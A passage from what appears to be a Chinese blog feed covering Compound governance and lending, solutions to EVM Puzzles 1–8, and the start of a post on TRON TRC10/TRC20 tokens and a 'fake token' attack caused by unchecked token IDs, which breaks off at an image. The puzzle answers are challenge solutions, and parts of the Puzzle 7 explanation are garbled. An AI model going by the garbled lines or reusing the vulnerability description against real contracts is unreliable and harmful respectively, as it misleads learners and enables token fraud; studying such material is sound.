rel="noopener">GovernorAlpha</a>，它包含了创建和执行提案的所有逻辑。</p><h4 id="propose-提案函数"><a href="#propose-提案函数" class="headerlink" title="propose-提案函数"></a>propose-提案函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">propose</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address[] memory targets, <span class="regexp">//</span> 所执动作作的目标地址。</span></span></span><br><span class="line"><span class="function"><span class="params">    uint[] memory values,     <span class="regexp">//</span> </span></span></span><br><span class="line"><span class="function"><span class="params">    要传递给调用的<span class="string">`msg.value`</span>。</span></span></span><br><span class="line"><span class="function"><span class="params">    string[] memory signatures, <span class="regexp">//</span> 调用的函数签名，例如：<span class="string">`transfer(address, amount)`</span>。</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes[] memory calldatas, <span class="regexp">//</span> 要传递给函数调用的数据（参数）</span></span></span><br><span class="line"><span class="function"><span class="params">    string memory description</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">returns</span> (<span class="params">uint</span>)</span></span><br></pre></td></tr></table></figure><ul><li><code>target</code>: 所执动作作的目标地址。</li><li><code>value</code>: 要传递给调用的<code>msg.value</code>。</li><li><code>signature</code>: 调用的函数签名，例如：<code>transfer(address, amount)</code>。</li><li><code>calldata</code>: 要传递给函数调用的数据（参数）</li></ul><h4 id="castVote-投票函数"><a href="#castVote-投票函数" class="headerlink" title="castVote() - 投票函数"></a>castVote() - 投票函数</h4><p>对一个提案进行投票。该账户的投票权重由该账户在提案状态生效时委托给它的投票数决定。</p><p>还有一个使用EIP-712离线签名投票的方法。它的思路与我们之前讨论的ERC-20-Permit是一样的，可以参考阅读<a href="https://learnblockchain.cn/article/1790" target="_blank" rel="noopener">无需gas代币的ERC20-Permit</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">castVote</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint proposalId,</span></span></span><br><span class="line"><span class="function"><span class="params">    bool support</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">castVoteBySig</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint proposalId,</span></span></span><br><span class="line"><span class="function"><span class="params">    bool support,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint8 v,</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes32 r,</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes32 s</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span></span><br></pre></td></tr></table></figure><h4 id="queue-加入到执行队列"><a href="#queue-加入到执行队列" class="headerlink" title="queue() - 加入到执行队列"></a>queue() - 加入到执行队列</h4><p>提案公投成功的条件是：</p><ul><li>大多数人投票支持该提案</li><li>并且至少有400,000张投票，即≥4%的发行量。</li></ul><p>在提案成功后，任何地址都可以调用<code>queue</code>方法，将提案移入Timelock队列。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">queue</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint proposalId</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span></span><br></pre></td></tr></table></figure><h4 id="execute-执行函数"><a href="#execute-执行函数" class="headerlink" title="execute() - 执行函数"></a>execute() - 执行函数</h4><p>一旦时间锁定延迟过去，任何人都可以调用执行方法。它将依次运行提案中的每个动作。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint proposalId</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span></span><br></pre></td></tr></table></figure><p>对于任何动作（target、value、signature、calldata），都通过这样的方式执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bytes memory callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);</span><br><span class="line">(bool success,) = target.call.value(value)(callData);</span><br></pre></td></tr></table></figure><p>calldata以函数选择器开始，它是函数签名字符串的哈希值的前四个字节。所以在这里我们只需将结果拼在现有的calldata中，然后在目标地址上进行call调用。</p><h4 id="cancel-取消提案函数"><a href="#cancel-取消提案函数" class="headerlink" title="cancel() - 取消提案函数"></a>cancel() - 取消提案函数</h4><p>在极少数情况下，被通过的提案仍然可以被取消。目前，仍然存在一个有权取消任何提案的监护人地址。它目前是由Compound Labs, Inc.自己持有。在未来，这个监护人地址可能会被删除。</p><p>如果最初的提议者在加入提案后失去了创建提案所需的COMP代币数量，那么提案也可以被取消。这可以防止有人进行恶意的提案，例如：COMP的价值可能因恶意提案被接受而下降之前立即卖掉他所有的COMP， cancel() 可以防止这样的情况。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cancel</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint proposalId</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span></span><br></pre></td></tr></table></figure><h4 id="state-获取提案状态"><a href="#state-获取提案状态" class="headerlink" title="state-获取提案状态"></a>state-获取提案状态</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">state</span>(<span class="params">uint proposalId</span>) <span class="title">returns</span> (<span class="params">ProposalState</span>)</span></span><br></pre></td></tr></table></figure><ul><li><p>proposalId : 提案ID，以获得其状态；</p></li><li><p>返回值 : 枚举类型 ProposalState。类型有：Pending(等待中)、Active(活动中)、</p><p>Canceled(已取消)、Defeated(已败北)、 Succeeded（已成功）、Queued（已排队）、Expired（已过期）和Executed（已执行）。</p></li></ul><h4 id="getReceipt-获取提案回执"><a href="#getReceipt-获取提案回执" class="headerlink" title="getReceipt-获取提案回执"></a>getReceipt-获取提案回执</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReceipt</span>(<span class="params">uint proposalId, address voter</span>) <span class="title">returns</span> (<span class="params">Receipt memory</span>)</span></span><br></pre></td></tr></table></figure><ul><li>proposalId : 提案ID，以获取投票者的选票收据；</li><li>voter : 提案投票者的账户地址；</li><li>RETURN : 错误时 revert。成功时返回投票者地址的选票收据结构数据。</li></ul><h3 id="TimeLock-sol"><a href="#TimeLock-sol" class="headerlink" title="TimeLock.sol"></a>TimeLock.sol</h3><p><a href="https://github.com/compound-finance/compound-protocol/blob/master/contracts/Timelock.sol" target="_blank" rel="noopener">Timelock</a>合约是对提案执行的一个包装。它由以下部分组成：</p><ul><li><em>delay(延时)</em>：一个提案被接受后，需要等待多少天之后才能被执行。这个时间可以由治理合约改变为2至30天之间。目前设置为2天。</li><li><em>提案执行期限(grace period)</em>：在延时到达时间之后，如果超过了grace period期，那么提案将不能再执行，被设置为14天。</li></ul><p>所有的函数都是围绕着这两个变量进行的操作</p>]]></content>
      
      
      <categories>
          
          <category> Coumpound </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coumpound </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compound系列（1）</title>
      <link href="/Compound-introduce/"/>
      <url>/Compound-introduce/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="Compound系列（1）"><a href="#Compound系列（1）" class="headerlink" title="Compound系列（1）"></a>Compound系列（1）</h1><h2 id="什么是compound"><a href="#什么是compound" class="headerlink" title="什么是compound"></a>什么是compound</h2><p>总的来说，Compound 其实就是区块链上银行。</p><p>Compound 是一个以太坊上的货币市场，一个任何用户、机构和 dApps 都可以使用的链上账本。它提供了存币和借币的功能，就像一个银行，用户可以存币获的利息收益，或进行抵押借币。在实现原理上，Compound 的帐本模型也与银行类似，并遵循了国际会计准则。</p><p>与 MakerDAO 类似，Compound 的贷款是通过<strong>超额抵押</strong>确立的。借贷者将代币存入 Compound 中以增加他们的 <strong>“借款能力”</strong>，如果借贷者的借款能力低于 0，他们的抵押品将被出售以偿还债务。另外，每个资产的贷款利率是不同的，这根据资产的需求而决定。</p><h2 id="Compound的运作机制"><a href="#Compound的运作机制" class="headerlink" title="Compound的运作机制"></a>Compound的运作机制</h2><p>Compound 协议让开发者可以基于以太坊建立各种各样的货币市场</p><p>所谓的「货币市场」，其实就是一个个的独立币池，每个币池里只有一种代币，<strong>协议</strong>通过算法来决定这个池子里的币<strong>借贷利率</strong>是多少。简单点说，这个算法会基于人们对这个币借贷的供需关系<strong>自动</strong>计算出利率。</p><p>不管你是来贷款还是放贷，你都是在跟 Compound 协议<strong>直接</strong>打交道。这一点跟那些点对点的借贷协议不太一样。在<strong>点对点</strong>的方案里，借贷双方会做匹配，然后你需要跟找你借钱的人（或者借你钱的人）进行<strong>沟通</strong>，双方自己商定好借款的利率、到期时间和抵押物品等等。</p><p>而在 Compound 协议里，每个代币（比如 Ether、Dai、USDC）都有一个属于自己的借贷市场，里面包含每个用户在这个市场里的余额，以及各笔生效的借贷交易，乃至每段时期的历史利率，等等。</p><p>用户可以通过抵押品的信贷额度无缝地从协议上借钱，你只需要看自己要借哪个币，不需要和别人沟通还款日期、利率，就能马上借钱。借款是实时且可预测的。每个货币市场都有一个由市场决定的浮动利率。</p><h2 id="Compound白皮书"><a href="#Compound白皮书" class="headerlink" title="Compound白皮书"></a>Compound白皮书</h2><h3 id="基础特性"><a href="#基础特性" class="headerlink" title="基础特性"></a>基础特性</h3><ul><li>资金池</li><li>基于供需法则，由算法生成利率</li><li>浮动利率，无需协商</li><li>完全透明的代币余额信息，记录所有历史利率</li></ul><h3 id="存币"><a href="#存币" class="headerlink" title="存币"></a>存币</h3><ul><li>汇聚用户的代币</li><li>实时提现</li><li>利息实时支付</li></ul><h3 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h3><ul><li>用户进行存款，低风险获得利息收入</li><li>dApp 应用程序、机构和交易所的代币增值</li></ul><h3 id="借币"><a href="#借币" class="headerlink" title="借币"></a>借币</h3><ul><li>需要超额抵押</li><li>无期限限制</li></ul><h3 id="风险控制"><a href="#风险控制" class="headerlink" title="风险控制"></a>风险控制</h3><ul><li>借出代币价值超过安全抵押率时，抵押会优于市场利率进行清算，鼓励套利者进行套利，降低风险</li></ul><h3 id="用例-1"><a href="#用例-1" class="headerlink" title="用例"></a>用例</h3><ul><li>快速借 utility token 进行使用。随时可借，无需等待（exchange 需要等待吃单）。</li><li>用户抵押持有的组合资产（多种代币）借出 ETH，进行 ICO 等投资。</li><li>做空</li></ul><h2 id="Compound-清算保证"><a href="#Compound-清算保证" class="headerlink" title="Compound 清算保证"></a>Compound 清算保证</h2><p>和 MakerDAO 一样， Compound 为了保持系统稳定运行，也设置了一套完备的风险和清算规则。</p><p>Compound 协议强制应用了一条规则，即每个账户必须拥有<strong>足够的余额</strong>能够偿还借款的额度，叫做<strong>抵押率</strong>。每个账户无法做出任何会使「余额／借款额度」低于「抵押率」的行为。比如再借更多的钱或者把抵押款的余额提现。要增大或者重置抵押率，用户可以全额或者部分偿还借款。任何被 Compound 持有的余额，包括用户用来做抵押品的余额，同时也会产生正常的应计利息。</p><p>如果一个用户提供的抵押资产，除以他们信用额度所借的款项，低于抵押率，那他们的抵押资产就会（通过借款资产）被出售，出售的价格是当前市场价格减去清算折扣（liquidation discount）。这个机制会激励系统里的套利者，去快速减少借款人还不了的借款资产的短缺，从而降低协议的风险。</p>]]></content>
      
      
      <categories>
          
          <category> Coumpound </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coumpound </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM_Puzzle</title>
      <link href="/EVM-Puzzle/"/>
      <url>/EVM-Puzzle/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM-Puzzle"><a href="#EVM-Puzzle" class="headerlink" title="EVM_Puzzle"></a>EVM_Puzzle</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>EVM_puzzle是一个可以很好的EVM入门阶段的一个可以上手的题库，正好最近在研究操作码的反编译，正好巩固熟练一下。</p><h2 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h2><p><img src="puzzle1.png" alt=""></p><p>我们只需要键入输入，使程序正常跳转到<code>JUMPDEST</code>即可，这道题里出现的所有操作码都只占一个字节，所以<code>JUMPDEST</code>应当位于8的位置上。</p><p>我们只需要键入8即可通关。</p><h2 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h2><p><img src="puzzle2.png" alt=""></p><p>同上一题一样，我们只需要键入输入，使程序正常跳转到<code>JUMPDEST</code>即可。</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#38" target="_blank" rel="noopener"><strong>CODESIZE</strong></a> 获取在当前环境中运行的代码的大小，并入栈。在此示例中，我们可以通过查看序列中有多少操作码来手动检查代码的大小。此题中出现操作码都是1个字节。</p><p>在这个谜题中，我们有10个操作码，这意味着代码的大小是10个字节。注意，EVM 使用十六进制数来表示字节码。所以这里是a</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#03" target="_blank" rel="noopener"><strong>SUB</strong></a> 会把第一个堆栈元素减去第二个堆栈元素，并将结果推送到堆栈的顶部。</p><p>根据<code>JUMP</code>的条件我们这里只需要让执行<code>JUMP</code>时栈顶的元素为6即可。</p><p>即 0a - input = 6</p><p>所以输入4即可通关。</p><h2 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h2><p><img src="puzzle3.png" alt=""></p><p>根据<code>JUMP</code>的条件我们这里只需要让执行<code>JUMP</code>时栈顶的元素为4即可。</p><p>即<code>CALLDATASIZE</code>等于4即可。</p><p>这里输入0x11223344即可通关</p><p>需要注意的是<code>CALLDATASIZE</code>统计的是字节数，而一个字节可以储存2个16进制数。所以我们应该输入8位十六进制数</p><h2 id="Puzzle-4"><a href="#Puzzle-4" class="headerlink" title="Puzzle 4"></a>Puzzle 4</h2><p><img src="puzzle4.png" alt=""></p><p>根据<code>JUMP</code>的条件我们这里只需要让执行<code>JUMP</code>时栈顶的元素为0a即可。</p><p>而此题中<code>CODESIZE</code>为12，<code>XOR</code>为二进制异或运算，我们只需要进行一次简单的计算即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000 1010 &#x2F;&#x2F;JUMP执行时栈顶所需  0a</span><br><span class="line"></span><br><span class="line">0000 1100 &#x2F;&#x2F;12  CODESIZE </span><br><span class="line">0000 0110 &#x2F;&#x2F;input</span><br></pre></td></tr></table></figure><p>因此，我们只需要输入<code>0000 0110</code>即 6 就可以通关</p><h2 id="Puzzle5"><a href="#Puzzle5" class="headerlink" title="Puzzle5"></a>Puzzle5</h2><p><img src="puzzle5.png" alt=""></p><p>根据EQ条件，我们只需要使value等于0x0100即可（256）</p><p>所以我们输入16，解决</p><h2 id="Puzzle6"><a href="#Puzzle6" class="headerlink" title="Puzzle6"></a>Puzzle6</h2><p><img src="puzzle6.png" alt=""></p><p>此题考查<code>CALLDATALOAD</code>，由于偏移量为0，我们只需要输入<code>0a</code>来使JUMP正常跳转即可</p><p>因此，输入为<code>0x000000000000000000000000000000000000000000000000000000000000000A</code></p><h2 id="Puzzle7"><a href="#Puzzle7" class="headerlink" title="Puzzle7"></a>Puzzle7</h2><p><img src="puzzle7.png" alt=""></p><p>这个题会稍微复杂一点，我们把这些字节码分开来看。</p><h3 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h3><p>此时的栈状态为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br></pre></td></tr></table></figure><p>者四个操作码为第一部分，前三个字节码均为<code>CALLDATACOPY</code>的参数，此操作码会将当前环境中的输入数据复制到内存</p><p>三个堆栈输入分别是</p><ol><li><code>destOffset</code>：将复制结果的<a href="https://www.evm.codes/about" target="_blank" rel="noopener">内存</a>中的字节偏移量。</li><li><code>offset</code>：要复制的<a href="https://www.evm.codes/about" target="_blank" rel="noopener">调用数据</a>中的字节偏移量。</li><li><code>size</code>：要复制的字节大小。</li></ol><p>因此我们可以分析出，当part1执行完之后，堆栈里的数据应该是完整的<code>calldata</code></p><h3 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h3><p>此时的栈状态为：<code>calldata</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br></pre></td></tr></table></figure><p>这里三个操作码都为<code>CREATE</code>的入参，<code>CREATE</code>操作会为我们创建一个创建具有关联代码的新帐户</p><p>它的堆栈输入分别是：</p><ol><li><code>value</code>：以<a href="https://www.investopedia.com/terms/w/wei.asp" target="_blank" rel="noopener">Wei</a>为单位的值发送到新帐户。</li><li><code>offset</code>：<a href="https://www.evm.codes/about" target="_blank" rel="noopener">内存</a>中的字节偏移量（以字节为单位），新帐户的初始化代码。</li><li><code>size</code>：要复制的字节大小（初始化代码的大小）。</li></ol><p>堆栈输出：</p><ol><li><code>address</code>：已部署合约的地址，如果部署失败，则为 0。</li></ol><p>有关于create创建合约地址的更多信息可以看<a href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/" target="_blank" rel="noopener">这篇文章</a>，写的比较明白。</p><p>当执行 theopcode 时，只有 theopcode 返回的代码才是将来调用已部署合约时将执行的“运行时代码”。字节码的另一部分只使用一次，仅用于该部分。<code>CREATE``RETURN``constructor</code></p><p>因此，我们可以在里面拥有我们想要的所有代码，但我们需要确保返回的代码（运行时代码）只有 1 条指令，因此将返回 1（字节）。<code>calldata``EXTCODESIZE</code></p><p>让我们看看<a href="https://www.evm.codes/#f3" target="_blank" rel="noopener">RETURN</a>操作码是如何工作的：它从堆栈中弹出 2 个值以将它们用作以下操作的输入：</p><ul><li>从开始读取的位置开始的内存偏移</li><li>要读取和返回的内存大小（以字节为单位）</li></ul><p>因此，无论内存中有什么，我们都只想返回 1 条 1 字节的指令。我们的目标是执行。<code>RETURN(offset=0, size=1)</code></p><p>用字节码翻译是。<code>600060005360016000F3</code></p><p>因此，如果我们传递拼图的调用数据，它将使用该调用数据来创建和部署一个新合约，该合约的运行时代码仅为：theopcode！<code>600160005360016000F3``00``STOP</code></p><p>其实只要让RETURN为一个字节就行，也就是以60016000F3结尾的字节码</p><p>最终输入0x60ff60005360016000F3通关</p><h2 id="Puzzle-8"><a href="#Puzzle-8" class="headerlink" title="Puzzle 8"></a>Puzzle 8</h2><p><img src="puzzle8.png" alt=""></p><p>这个题的操作码也比较多，我们仍然把他们拆分着看</p><h3 id="part1-1"><a href="#part1-1" class="headerlink" title="part1"></a>part1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br></pre></td></tr></table></figure><p>这一部分和上一题一样，返回栈顶的是calldata的值</p><h3 id="part2-1"><a href="#part2-1" class="headerlink" title="part2"></a>part2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br></pre></td></tr></table></figure><p>这里也是一样，创建一个合约</p><h3 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br></pre></td></tr></table></figure><p>这里调用了之前创建出来的合约</p><p>等价于：<code>CALL(gas=ALL_THE_GAS_AVAILABLE, address=ADDRESS_FROM_CREATE, value: 0, argsOffset=0, argsSize=0, retOffset=0, retSize=0)</code></p><p>在这里，我们只是调用部署的合约，没有任何 calldata 参数，也没有从返回值中读取任何内容。</p><p>执行堆栈后将只有一个值。如果已<strong>还原</strong>，则为 0，否则为 1。<code>CALL</code></p><h3 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br></pre></td></tr></table></figure><p>这里是通关条件，很显然，我们需要使Call调用的入栈值为00</p><p>因此我们只需要构造一个这样的合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; store in memory the REVERT opcode as the only “code” of the contract</span><br><span class="line">PUSH1 01</span><br><span class="line">PUSH1 00</span><br><span class="line">MSTORE8</span><br><span class="line">&#x2F;&#x2F; make the constructor return the stored runtime code</span><br><span class="line">PUSH1 01</span><br><span class="line">PUSH1 00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>字节码为:<code>600160005360016000F3</code></p><p>那么这就将成为我们calldata的传入内容</p>]]></content>
      
      
      <categories>
          
          <category> EVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TRC10 TRC20 &amp;&amp; 假币攻击</title>
      <link href="/TRC10TRC20-%E5%81%87%E5%B8%81%E6%94%BB%E5%87%BB/"/>
      <url>/TRC10TRC20-%E5%81%87%E5%B8%81%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<pre><code>author：Thomas_Xu</code></pre><h1 id="TRC10-TRC20-amp-amp-假币攻击"><a href="#TRC10-TRC20-amp-amp-假币攻击" class="headerlink" title="TRC10 TRC20 &amp;&amp; 假币攻击"></a>TRC10 TRC20 &amp;&amp; 假币攻击</h1><p><strong>波场TRON的网络协议一共有两种，分别是TRC 10和TRC 20。</strong></p><p>现在分开来讲一下TRC10和TRC20两种协议</p><h2 id="TRC10"><a href="#TRC10" class="headerlink" title="TRC10"></a>TRC10</h2><p>TRC 10是波场最初就拥有的网络协议，甚至早于波场主网上线，也正是因为如此，<strong>没有在虚拟机上运行的TRC 10成本较低，仅仅需要扣除一些带宽费即可，不会有其他任何费用</strong>，加上其代码开源，不会受到攻击或被滥用。</p><p>此外，TRC 10代币的易用性还比较高，可以在智能合约上实现自身交互，是传统代币与TRC 10代币之间的桥梁。TRC10继承了原有开发TRC代币的稳定性。</p><h2 id="TRC20"><a href="#TRC20" class="headerlink" title="TRC20"></a>TRC20</h2><p><strong>TRC 20协议是由ERC 20转化而来</strong>，但是其具有更强的社区支持，不仅可以运行支持波场的智能合约，还能支持以太坊的智能合约，开发者可以轻松地把以太坊智能合约迁移到波场主网上来，灵活性更高，给了开发者更大的自由度。</p><p><strong>特别是TRC 20协议还能形成对TRC 10协议的互补，可以实现TRC-10 协议所不能实现的额外逻辑，这让波场的网络协议得到了更大的能量释放。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title </span>TRC20 interface (compatible with ERC20 interface)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev </span>see https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface ITRC20 &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">totalSupply</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">balanceOf</span>(<span class="params">address who</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">allowance</span>(<span class="params">address owner, address spender</span>)</span></span><br><span class="line"><span class="function">    <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">transfer</span>(<span class="params">address to, uint256 value</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">approve</span>(<span class="params">address spender, uint256 value</span>)</span></span><br><span class="line"><span class="function">    <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">transferFrom</span>(<span class="params">address from, address to, uint256 value</span>)</span></span><br><span class="line"><span class="function">    <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">event</span> <span class="title">Transfer</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        address indexed from,</span></span></span><br><span class="line"><span class="function"><span class="params">        address indexed to,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">event</span> <span class="title">Approval</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        address indexed owner,</span></span></span><br><span class="line"><span class="function"><span class="params">        address indexed spender,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>如上是TRC20的官方接口，其实可以看出来和ERC20没有本质上的区别。</p><h2 id="假币攻击"><a href="#假币攻击" class="headerlink" title="假币攻击"></a>假币攻击</h2><p>假币攻击是由于接收代币时没有查验其tokenid是否为该代币的id，出现此漏洞主要是由于开发者没有足够了解波场合约代币机制的研究不足，可能套用了以太坊的token发行机制。</p><p>这是著名的BTT假币攻击事件。</p><p><img src="invest.png" 